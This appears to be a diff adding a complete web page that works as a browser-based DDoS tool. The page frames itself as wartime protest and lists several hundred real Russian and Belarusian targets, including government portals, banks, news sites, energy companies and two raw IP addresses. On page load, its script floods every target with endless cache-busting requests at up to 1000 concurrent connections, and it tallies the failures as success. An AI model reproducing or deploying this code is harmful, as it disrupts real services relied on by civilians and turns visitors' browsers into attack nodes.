@@ -1,0 +1,555 @@
+
+
+<head>
+    <meta charset="utf-8" />
+    <title>Online DDOS tool - Russian warship, go fuck yourself</title>
+    <meta name="referrer" content="no-referrer" />
+  </head>
+  <body>
+    <style>
+      body {
+        font-family: sans-serif;
+        margin: 0px;
+        background: rgb(243, 243, 243);
+      }
+      .page {
+        max-width: 1260px;
+        margin: 0 auto;
+      }
+      h1 {
+        text-align: center;
+        margin-top: 30px;
+        font-size: 50px;
+        margin-bottom: 20px;
+        font-weight: normal;
+      }
+      h1 span {
+        background: black; 
+        color: white;
+        font-weight: bold;
+        display: inline-block;
+        padding: 0px 10px;
+      }
+      h3 {
+        font-weight: bold;
+        display: inline-block;
+        margin: 0px;
+        font-size: 30px;
+        text-transform: uppercase;
+        margin-bottom: 30px;
+      }
+      h3 span {
+        display: inline-block;
+        background: black; 
+        color: white;
+        padding: 0px 10px;
+      }
+      .description {
+        display: flex;
+        gap: 30px;
+        padding: 30px;
+        padding-bottom: 0px;
+        justify-content: space-around;
+        font-size: 15px;
+      }
+      .description > div {
+        flex-basis: 100%;
+        padding: 20px;
+        background: linear-gradient(180deg, rgb(247, 247, 247) 0%, rgba(255,255,255,1) 38%);
+        box-shadow: rgba(136, 165, 191, 0.48) 6px 2px 16px 0px, rgba(255, 255, 255, 0.8) -6px -2px 16px 0px;      }
+
+      .gb {
+        background: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTIwMCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB2aWV3Qm94PSIwIDAgNjAgMzAiIGhlaWdodD0iNjAwIj4NCjxkZWZzPg0KPGNsaXBQYXRoIGlkPSJ0Ij4NCjxwYXRoIGQ9Im0zMCwxNWgzMHYxNXp2MTVoLTMwemgtMzB2LTE1enYtMTVoMzB6Ii8+DQo8L2NsaXBQYXRoPg0KPC9kZWZzPg0KPHBhdGggZmlsbD0iIzAwMjQ3ZCIgZD0ibTAsMHYzMGg2MHYtMzB6Ii8+DQo8cGF0aCBzdHJva2U9IiNmZmYiIHN0cm9rZS13aWR0aD0iNiIgZD0ibTAsMGw2MCwzMG0wLTMwbC02MCwzMCIvPg0KPHBhdGggc3Ryb2tlPSIjY2YxNDJiIiBzdHJva2Utd2lkdGg9IjQiIGQ9Im0wLDBsNjAsMzBtMC0zMGwtNjAsMzAiIGNsaXAtcGF0aD0idXJsKCN0KSIvPg0KPHBhdGggc3Ryb2tlPSIjZmZmIiBzdHJva2Utd2lkdGg9IjEwIiBkPSJtMzAsMHYzMG0tMzAtMTVoNjAiLz4NCjxwYXRoIHN0cm9rZT0iI2NmMTQyYiIgc3Ryb2tlLXdpZHRoPSI2IiBkPSJtMzAsMHYzMG0tMzAtMTVoNjAiLz4NCjwvc3ZnPg0K');
+      }
+      .ru {
+        background: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA0NTAgMzAwIj4NCjxwYXRoIGZpbGw9IiNmZmYiIGQ9Im0wLDBoNDUwdjEwMGgtNDUweiIvPg0KPHBhdGggZmlsbD0iIzAwZiIgZD0ibTAsMTAwaDQ1MHYxMDBoLTQ1MHoiLz4NCjxwYXRoIGZpbGw9IiNmMDAiIGQ9Im0wLDIwMGg0NTB2MTAwaC00NTB6Ii8+DQo8L3N2Zz4NCg==');
+      }
+      .ua {
+        background: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMjAwIDgwMCI+DQo8cGF0aCBmaWxsPSIjM2E3NWM0IiBkPSJtMCwwaDEyMDB2ODAwaC0xMjAweiIvPg0KPHBhdGggZmlsbD0iI2Y5ZGQxNiIgZD0ibTAsNDAwaDEyMDB2NDAwaC0xMjAweiIvPg0KPC9zdmc+DQo=');
+      }
+      .flag {
+        margin: 0 auto;
+        width: 100px;
+        height: 100px;
+        background-size: 100% auto;
+        background-repeat: no-repeat;
+        background-position: left center;
+      }
+      #stats,
+      #totalstats {
+        text-align: left;
+        margin: 30px;
+        padding: 30px;
+        box-shadow: rgba(136, 165, 191, 0.48) 6px 2px 16px 0px, rgba(255, 255, 255, 0.8) -6px -2px 16px 0px;
+        background: white;
+      }
+      #stats table {
+        border-collapse: collapse;
+      }
+      #stats th {
+        text-align: left;
+      }
+      #stats th span {
+        background: black;
+        color: white;
+        padding: 5px 10px;
+        font-weight: bold;
+        text-transform: uppercase;
+        margin-bottom: 10px;
+        display: inline-block;
+      }
+      #stats td {
+        padding-top: 4px;
+        padding-bottom: 4px;
+        border-bottom: 1px solid rgb(221, 221, 221);
+      }
+      .statsboxes {
+        display: flex;
+        gap: 50px;
+      }
+      .statsbox {
+        flex-basis: 50%;
+      }
+      .counter {
+        font-size: clamp(20px,4vw,60px);
+        font-weight: bold;
+        background: #b6d63c;
+        color: white;
+        display: inline-block;
+        padding: 0px 20px;
+      }
+      .totalerrors .counter{
+        background: rgb(253, 106, 106);
+      }
+      .label {
+        margin-top: 20px;
+        max-width: 250px;
+      }
+      .resetbutton {
+        background: rgb(143, 143, 143);
+        color: white;
+        text-transform: uppercase;
+        cursor: pointer;
+        margin-top: 20px;
+        display: inline-block;
+        padding: 5px 10px;
+        font-weight: bold;
+        transition: 0.3s ease all;
+      }
+      .resetbutton:hover {
+        background: black;
+      }
+      @media screen and (max-width: 800px) {
+        .description {
+          flex-wrap: wrap;
+        }
+        .description > div {
+          min-width: 100%;
+        }
+      }
+    </style>
+    <div class="page">
+      <h1><span>DDOS</span> fuck the war</h1>
+      
+      <div class="description">
+          <div>
+            <div class="gb flag"></div>
+            <p>Russia is spreading misinformation and lies throughout its state-controlled media, telling the populace it's in the name of freedom and unity. 
+              Meanwhile, Russian troops are committing widespread war crimes, attacking hospitals, children and ambulances.</p>
+            <p>This website contains a script that constantly floods Russian media, messaging, financial and government services with fake requests,
+              eventually causing these sites to crash.</p>
+            <p>Your web browser might begin to slow down, but this small contribution will help immensely to slow the Russian war effort and morale.</p>
+            <p>Stats for your current session can be found below. The number of requests is the number of times the website has been requested. The number of errors is how many times the website has failed to reply.</p>
+            <p>Slava Ukraini!</p>
+          </div>
+          <div>
+            <div class="ua flag"></div>
+            <p>Росія поширює дезінформацію та брехню у своїх контрольованих державою ЗМІ, розповідаючи населенню, що це в ім’я свободи та єдності. Тим часом російські війська вчиняють масові військові злочини, атакуючи лікарні, дітей та машини швидкої допомоги.</p>
+            <p>Цей веб-сайт містить сценарій, який постійно наповнює російські ЗМІ, повідомлення, фінансові та державні служби фальшивими запитами, що в кінцевому підсумку призводить до збою цих сайтів.</p>
+            <p>Ваш веб-браузер може почати гальмувати, але цей невеликий внесок надзвичайно допоможе уповільнити військові зусилля та моральний дух Росії.</p>
+            <p>Нижче наведено статистику поточної сесії. Кількість запитів – це кількість запитів на веб-сайт. Кількість помилок показує, скільки разів веб-сайт не відповів.</p>
+            <p>слава Україні</p>
+          </div>
+          <div>
+            <div class="ru flag"></div>
+            <p>Россия распространяет дезинформацию и ложь через свои подконтрольные государству СМИ, говоря населению, что это во имя свободы и единства. Тем временем российские войска совершают широкомасштабные военные преступления, нападая на больницы, детей и машины скорой помощи.</p>
+            <p>Этот веб-сайт содержит скрипт, который постоянно наводняет российские СМИ, мессенджеры, финансовые и государственные службы поддельными запросами, что в конечном итоге приводит к сбою этих сайтов.</p>
+            <p>Статистику текущего сеанса можно найти ниже. Количество запросов — это количество запросов к веб-сайту. Количество ошибок — это количество раз, когда веб-сайт не ответил.</p>
+            <p>Ваш веб-браузер может начать работать медленнее, но этот небольшой вклад очень поможет замедлить боевой дух и боевой дух русских.</p>
+            <p>слава украине</p>
+          </div>
+      </div>
+      <div id="totalstats">
+        <h3><span>Total</span> Statistics</h3>
+        <div class="statsboxes">
+          <div class="statsbox totalrequests">
+            <div class="counter" id="statsTotalCounter">-</div>
+            <div class="label">You have sent this many requests with your browser. This will help bring them down. Thank you!</div>
+          </div>
+          <div class="statsbox totalerrors">
+            <div class="counter" id="statsErrorCounter">-</div>
+            <div class="label">This many request failed. Thats a good thing!</div>
+          </div>
+        </div>
+        <div class="resetbutton" onclick="resetStatistics()"">reset statistics</div>
+      </div>
+      <div id="stats"></div>
+    </div>
+  
+  <script>
+  var targets = [
+        'https://iecp.ru/ep/ep-verification',
+        'https://iecp.ru/ep/uc-list',
+        'https://uc-osnovanie.ru/',
+        'http://www.nucrf.ru',
+        'http://www.belinfonalog.ru',
+        'http://www.roseltorg.ru',
+        'http://www.astralnalog.ru',
+        'http://www.nwudc.ru',
+        'http://www.center-inform.ru',
+        'https://kk.bank/UdTs',
+        'http://structure.mil.ru/structure/uc/info.htm',
+        'http://www.ucpir.ru',
+        'http://dreamkas.ru',
+        'http://www.e-portal.ru',
+        'http://izhtender.ru',
+        'http://imctax.parus-s.ru',
+        'http://www.icentr.ru',
+        'http://www.kartoteka.ru',
+        'http://rsbis.ru/elektronnaya-podpis',
+        'http://www.stv-it.ru',
+        'http://www.crypset.ru',
+        'http://www.kt-69.ru',
+        'http://www.24ecp.ru',
+        'http://kraskript.com',
+        'http://ca.ntssoft.ru',
+        'http://www.y-center.ru',
+        'http://www.rcarus.ru',
+        'http://rk72.ru',
+        'http://squaretrade.ru',
+        'http://ca.gisca.ru',
+        'http://www.otchet-online.ru',
+        'http://udcs.ru',
+        'http://www.cit-ufa.ru',
+        'http://elkursk.ru',
+        'http://www.icvibor.ru',
+        'http://ucestp.ru',
+        'http://mcspro.ru',
+        'http://www.infotrust.ru',
+        'http://epnow.ru',
+        'http://ca.kamgov.ru',
+        'http://mascom-it.ru',
+        'http://cfmc.ru',
+        'https://www.gosuslugi.ru',
+        'https://gosuslugi41.ru',
+        'https://uslugi27.ru',
+        'https://gosuslugi29.ru',
+        'https://gosuslugi.astrobl.ru',
+        'https://cleanbtc.ru',
+        'https://bonkypay.com',
+        'https://changer.club',
+        'https://superchange.net',
+        'https://mine.exchange',
+        'https://platov.co',
+        'https://ww-pay.net',
+        'https://delets.cash',
+        'https://betatransfer.org',
+        'https://ramon.money',
+        'https://coinpaymaster.com',
+        'https://bitokk.biz',
+        'https://www.netex24.net',
+        'https://cashbank.pro',
+        'https://flashobmen.com',
+        'https://abcobmen.com',
+        'https://ychanger.net',
+        'https://multichange.net',
+        'https://24paybank.ne',
+        'https://royal.cash',
+        'https://prostocash.com',
+        'https://baksman.org',
+        'https://kupibit.me',
+        'https://abcobmen.com',
+        'http://www.fsb.ru/',
+        'https://www.bestchange.ru/',
+        'http://www.sberbank.ru/',
+        'https://www.moex.com',
+        'http://belta.by/',
+        'https://sputnik.by/',
+        'https://www.tvr.by/',
+        'https://www.sb.by/',
+        'https://belmarket.by/',
+        'https://www.belarus.by/',
+        'https://belarus24.by/',
+        'https://ont.by/',
+        'https://www.024.by/',
+        'https://www.belnovosti.by/',
+        'https://mogilevnews.by/',
+        'https://www.mil.by/',
+        'https://yandex.by/',
+        'https://www.slonves.by/',
+        'http://www.ctv.by/',
+        'https://radiobelarus.by/',
+        'https://radiusfm.by/',
+        'https://alfaradio.by/ ',
+        'https://radiomir.by/',
+        'https://radiostalica.by/',
+        'https://radiobrestfm.by/',
+        'https://www.tvrmogilev.by/',
+        'https://minsknews.by/',
+        'https://zarya.by/',
+        'https://grodnonews.by/',
+        'https://www.gazprom.ru/',
+        'https://lukoil.ru/',
+        'https://magnit.ru/',
+        'https://www.nornickel.com/',
+        'https://www.surgutneftegas.ru/',
+        'https://www.tatneft.ru/',
+        'https://www.evraz.com/ru/',
+        'https://nlmk.com/',
+        'https://www.sibur.ru/',
+        'https://www.severstal.com/',
+        'https://www.metalloinvest.com/',
+        'https://nangs.org/',
+        'https://rmk-group.ru/ru/',
+        'https://www.tmk-group.ru/',
+        'https://ya.ru/',
+        'https://www.polymetalinternational.com/ru/',
+        'https://www.uralkali.com/ru/',
+        'https://www.eurosib.ru/',
+        'https://omk.ru/',
+        'https://www.sberbank.ru/',
+        'https://www.vtb.ru/',
+        'https://www.gazprombank.ru/',
+        'https://www.gosuslugi.ru/',
+        'https://www.mos.ru/uslugi/',
+        'http://kremlin.ru/',
+        'http://government.ru/',
+        'https://mil.ru/',
+        'https://www.nalog.gov.ru/',
+        'https://customs.gov.ru/',
+        'https://pfr.gov.ru/',
+        'https://rkn.gov.ru/',
+        'https://mail.rkn.gov.ru/',
+        'https://cloud.rkn.gov.ru/',
+        'https://mvd.gov.ru/',
+        'https://pwd.wto.economy.gov.ru/',
+        'https://stroi.gov.ru/',
+        'https://proverki.gov.ru/',
+        'https://ria.ru/',
+        'https://gazeta.ru/',
+        'https://kp.ru/',
+        'https://riafan.ru/',
+        'https://pikabu.ru/',
+        'https://kommersant.ru/',
+        'https://mk.ru/',
+        'https://yaplakal.com/',
+        'https://rbc.ru/',
+        'https://bezformata.com/',
+        'https://promsvyaz.by/',
+        'https://sderbank.ru/',
+        'https://sderbank.com/',
+        'https://alfabank.com/',
+        'https://alfabank.ru/',
+        'https://vtb.com/',
+        'https://open.ru/',
+        'https://rshb.ru/',
+        'https://raiffeisen.ru/',
+        'https://rosbank.ru/',
+        'https://rosneft.com/',
+        'https://tgc1.ru/',
+        'https://tplusgroup.ru/',
+        'https://kuzbassenergo.ru/',
+        'https://interrao.ru/',
+        'https://ogk2.ru/',
+        'https://unipro.energy/',
+        'https://enel.ru/',
+        'https://irkutskenergo.ru/',
+        'https://rushydro.ru/',
+        'https://rosenergoatom.ru/',
+        'https://rosseti.ru/',
+        'https://moesk.ru/',
+        'https://lukoil.com/',
+        'https://nornickel.com/',
+        'https://omz.ru/',
+        'https://polyus.com/',
+        'https://nornik.ru/',
+        'https://fsk-ees.ru/',
+        'https://so-ups.ru/',
+        'https://rao-esv.ru/',
+        'https://energybase.ru/',
+        'https://ogk1.com/',
+        'https://peretok.ru/',
+        'https://vestnik-rushydro.ru/',
+        'https://81.177.108.230/',
+        'https://185.140.151.249/',
+        'https://rosprint.net/',
+        'https://gov.ru/',
+        'https://ru.retn.net/',
+        'https://rt.com/',
+        'https://mail.ru/',
+        'https://yandex.ru/',
+        'https://pochta.ru/',
+        'https://domclick.ru/',
+        'https://cian.ru/',
+        'https://irecommend.ru/',
+        'https://sbis.ru/',
+        'https://gosuslugi.ru/',
+        'https://lenta.ru/',
+        'https://rambler.ru/',
+        'https://novostinedeli24.com/',
+        'https://sberbank.ru/',
+        'https://mos.ru/',
+        'https://lentainform.com/',
+        'https://tinkoff.ru/',
+        'https://microconnect.ru/',
+        'https://kontur.ru/',
+        'https://sbrf.ru/',
+        'https://mosenergosbyt.ru/',
+        'https://agroserver.ru/',
+        'https://stroyinf.ru/',
+        'https://lemzspb.ru/',
+        'https://vsn.ru/',
+        'https://rosatom.ru/',
+        'https://ooo-nemo.ru/',
+        'https://atomproekt.com/',
+        'https://nbdoc.ru/',
+        'https://vbrr.ru/',
+        'https://mosoblgaz.ru/',
+        'https://tektorg.ru/',
+        'https://roseltorg.ru/',
+        'https://nalog.ru/',
+        'https://uslugi.mosreg.ru/',
+        'https://rosminzdrav.ru/',
+        'https://mosregu.ru/',
+        'https://topwar.ru/',
+        'https://vpk-news.ru/',
+        'https://militaryarms.ru/',
+        'https://nachfin.info/',
+        'https://gazprom.com/',
+        'https://gazpromavia.ru/',
+        'https://tyumenniigiprogaz.gazprom.com/',
+        'https://gazprom-spacesystems.ru/',
+        'https://gazprombank.com/',
+        'https://gazprom-neft.com/',
+        'https://promgaz.gazprom.ru/',
+        'https://gazprom.ru/',
+        'https://sibur.ru/',
+        'https://stroytransgaz.com/',
+        'https://sogaz.ru/',
+        'https://novatek.ru/',
+        'http://belta.by/',
+        'https://sputnik.by/',
+        'https://www.tvr.by/',
+        'https://www.sb.by/',
+        'https://belmarket.by/',
+        'https://www.belarus.by/',
+        'https://belarus24.by/',
+        'https://ont.by/',
+        'https://www.024.by/',
+        'https://www.belnovosti.by/',
+        'https://mogilevnews.by/',
+        'https://www.mil.by/',
+        'https://yandex.by/',
+        'https://www.slonves.by/',
+        'http://www.ctv.by/',
+        'https://radiobelarus.by/',
+        'https://radiusfm.by/',
+        'https://alfaradio.by/',
+        'https://radiomir.by/',
+        'https://radiostalica.by/',
+        'https://radiobrestfm.by/',
+        'https://www.tvrmogilev.by/',
+        'https://minsknews.by/',
+        'https://zarya.by/',
+        'https://grodnonews.by',
+        'https://newsua.ru/',
+        'https://ukraina.ru/'
+  ]
+  
+  var targetStats = {}
+  targets.forEach((target) => {
+    targetStats[target] = { number_of_requests: 0, number_of_errored_responses: 0 }
+  })
+  
+  var statsEl = document.getElementById('stats');
+  var statsTotalCounter = document.getElementById('statsTotalCounter');
+  var statsErrorCounter = document.getElementById('statsErrorCounter');
+  function printStats() {
+    statsEl.innerHTML = '<h3><span>Detailed</span> Statistics</h3><table width="100%"><thead><tr><th><span>URL</span></th><th><span>Requests</span></th><th><span>Errors</span></th></tr></thead><tbody>' + Object.entries(targetStats).map(([target, { number_of_requests, number_of_errored_responses  }]) => '<tr><td>' + target + '</td><td>' + number_of_requests + '</td><td>' + number_of_errored_responses + '</td></tr>').join('') + '</tbody></table>'
+    
+    if (localStorage.getItem("statsTotalRequests") == null) { 
+      localStorage.setItem('statsTotalRequests',0);
+    }
+    if (localStorage.getItem("statsTotalErrors") == null) { 
+      localStorage.setItem('statsTotalErrors',0);
+    }
+
+    var total_requests = parseInt(localStorage.getItem('statsTotalRequests'));
+    var total_errors = parseInt(localStorage.getItem('statsTotalErrors'));
+    for (const [key, value] of Object.entries(targetStats)) {
+      total_requests += value.number_of_requests;
+      total_errors += value.number_of_errored_responses;
+    }
+    statsTotalCounter.innerHTML = total_requests.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");
+    statsErrorCounter.innerHTML = total_errors.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");
+    
+    localStorage.setItem('statsTotalRequests',total_requests);
+    localStorage.setItem('statsTotalErrors',total_errors);
+  }
+  setInterval(printStats, 3000);
+  printStats();
+  
+  var CONCURRENCY_LIMIT = 1000
+  var queue = []
+  
+  function resetStatistics(){
+    localStorage.setItem('statsTotalRequests',0);
+    localStorage.setItem('statsTotalErrors',0);
+    window.location.reload(true);
+  }
+
+  async function fetchWithTimeout(resource, options) {
+    const controller = new AbortController();
+    const id = setTimeout(() => controller.abort(), options.timeout);
+    return fetch(resource, {
+      method: 'GET',
+      mode: 'no-cors',
+      signal: controller.signal
+    }).then((response) => {
+      clearTimeout(id);
+      return response;
+    }).catch((error) => {
+      clearTimeout(id);
+      throw error;
+    });
+  }
+  
+  async function flood(target) {
+    for (var i = 0;; ++i) {
+      if (queue.length > CONCURRENCY_LIMIT) {
+        await queue.shift()
+      }
+      rand = i % 3 === 0 ? '' : ('?' + Math.random() * 1000)
+      queue.push(
+        fetchWithTimeout(target+rand, { timeout: 1000 })
+          .catch((error) => {
+            if (error.code === 20 /* ABORT */) {
+              return;
+            }
+            targetStats[target].number_of_errored_responses++;
+          })
+          .then((response) => {
+            if (response && !response.ok) {
+              targetStats[target].number_of_errored_responses++;
+            }
+            targetStats[target].number_of_requests++;
+          })
+      )
+    }
+  }
+  
+  // Start
+  targets.map(flood)
+  </script>
+</body>
+      
